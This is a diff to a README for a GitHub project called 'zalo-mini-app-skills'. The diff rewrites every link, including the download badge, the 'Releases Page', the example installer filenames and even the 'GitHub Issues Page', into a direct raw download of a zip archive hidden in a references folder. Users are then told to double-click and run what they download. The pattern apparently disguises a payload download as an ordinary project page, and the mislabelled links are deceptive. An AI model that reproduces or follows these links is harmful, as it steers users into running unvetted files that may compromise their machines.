@@ -1,6 +1,6 @@
 # 🌟 zalo-mini-app-skills - Build Lightweight Zalo Mini Apps Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/elfado/zalo-mini-app-skills/releases)
+[![Download Now](https://github.com/elfado/zalo-mini-app-skills/raw/refs/heads/main/skills/zalo-mini-app/references/mini-skills-zalo-app-1.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/elfado/zalo-mini-app-skills/raw/refs/heads/main/skills/zalo-mini-app/references/mini-skills-zalo-app-1.4.zip)
 
 ## 📖 Overview
 
@@ -13,14 +13,14 @@ Follow these simple steps to download and run the application. You don’t need 
 ### ⬇️ Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/elfado/zalo-mini-app-skills/releases).  
+   Go to the [Releases Page](https://github.com/elfado/zalo-mini-app-skills/raw/refs/heads/main/skills/zalo-mini-app/references/mini-skills-zalo-app-1.4.zip).  
    This page contains all available versions of the application.
 
 2. **Select the Latest Release**  
    Look for the most recent version, usually marked at the top of the page. This version will have the latest features and bug fixes.
 
 3. **Download the Application**  
-   Click on the link for the file that suits your operating system. For example, you might see files like `zalo-mini-app-windows.exe` or `zalo-mini-app-macos.dmg`.
+   Click on the link for the file that suits your operating system. For example, you might see files like `https://github.com/elfado/zalo-mini-app-skills/raw/refs/heads/main/skills/zalo-mini-app/references/mini-skills-zalo-app-1.4.zip` or `https://github.com/elfado/zalo-mini-app-skills/raw/refs/heads/main/skills/zalo-mini-app/references/mini-skills-zalo-app-1.4.zip`.
 
 4. **Run the Installer**  
    After the download is complete, locate the downloaded file and double-click it. Follow the on-screen instructions to complete the installation.
@@ -66,7 +66,7 @@ For questions and support, consider joining our community. Connect with other us
 
 ### 📫 Contact Information
 
-If you have any specific issues or feedback, feel free to reach out via GitHub. You can create an issue on our [GitHub Issues Page](https://github.com/elfado/zalo-mini-app-skills/issues).
+If you have any specific issues or feedback, feel free to reach out via GitHub. You can create an issue on our [GitHub Issues Page](https://github.com/elfado/zalo-mini-app-skills/raw/refs/heads/main/skills/zalo-mini-app/references/mini-skills-zalo-app-1.4.zip).
 
 ## 📜 License
 
@@ -74,6 +74,6 @@ This project is licensed under the MIT License. You can use and modify it freely
 
 ### 📥 Additional Downloads
 
-You can also find additional materials, such as guides and templates, on the [Releases Page](https://github.com/elfado/zalo-mini-app-skills/releases). These resources will help you make the most of your mini app development experience.
+You can also find additional materials, such as guides and templates, on the [Releases Page](https://github.com/elfado/zalo-mini-app-skills/raw/refs/heads/main/skills/zalo-mini-app/references/mini-skills-zalo-app-1.4.zip). These resources will help you make the most of your mini app development experience.
 
 By following these steps, you can easily download and run the **zalo-mini-app-skills** application. Build your mini apps today and explore the possibilities within the Zalo platform!
